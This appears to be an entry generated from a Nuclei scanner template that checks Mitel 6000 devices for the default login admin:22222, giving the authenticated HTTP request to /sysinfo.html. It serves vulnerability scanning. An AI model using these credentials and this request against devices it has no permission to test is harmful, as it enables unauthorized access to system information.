# Nuclei Template: Mitel 6000 - Default Login
**Template ID:** mitel-6000-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`mitel-6000-default-login.yaml`)

## Vulnerability Information & PoC

## Description
This template detects the use of default credentials (admin:22222) on Mitel 6000 devices, which may allow unauthorized access to system information.

## Steps to reproduce / Exploit Payload
```http
GET /sysinfo.html HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64('{{username}}:{{password}}')}}
```

## References
- https://wiki.bicomsystems.com/UADs/Mitel_6930
